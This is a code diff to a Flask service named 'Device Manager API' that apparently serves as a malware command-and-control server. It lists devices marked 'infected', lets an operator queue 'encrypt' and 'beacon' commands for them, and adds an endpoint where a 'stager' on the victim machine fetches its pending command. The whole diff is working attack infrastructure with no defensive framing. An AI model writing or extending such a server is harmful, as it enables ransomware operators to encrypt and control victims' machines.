@@ -8,6 +8,9 @@ devices = [
     {'id': '2', 'name': 'Device 2', 'status': 'infected', 'ip': '192.168.1.3'},
 ]
 
+# Command queue: device_id -> command string
+commands = {}
+
 @app.route('/')
 def index():
     return 'Device Manager API is running.'
@@ -28,20 +31,33 @@ def handle_devices():
     return jsonify(devices)
 
 @app.route('/command', methods=['POST'])
-def send_command():
+def handle_command():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'Invalid JSON'}), 400
+
     device_id = data.get('deviceId')
     command = data.get('command')
-    for device in devices:
-        if device['id'] == device_id:
-            if command == 'encrypt':
-                device['status'] = 'encrypting'
-            elif command == 'beacon':
-                device['status'] = 'beaconing'
-            return jsonify({'success': True})
-    return jsonify({'error': 'Device not found'}), 404
+
+    # If command is provided, store it (dashboard -> server)
+    if command:
+        commands[device_id] = command
+        # Update device status
+        for device in devices:
+            if device['id'] == device_id:
+                if command == 'encrypt':
+                    device['status'] = 'encrypting'
+                elif command == 'beacon':
+                    device['status'] = 'beaconing'
+                break
+        return jsonify({'success': True, 'message': 'Command stored'})
+
+    # If no command, retrieve pending command for this device (stager -> server)
+    pending = commands.get(device_id)
+    if pending:
+        return jsonify({'command': pending})
+    else:
+        return jsonify({'command': None})
 
 @app.route('/beacon', methods=['GET', 'POST'])
 def beacon():
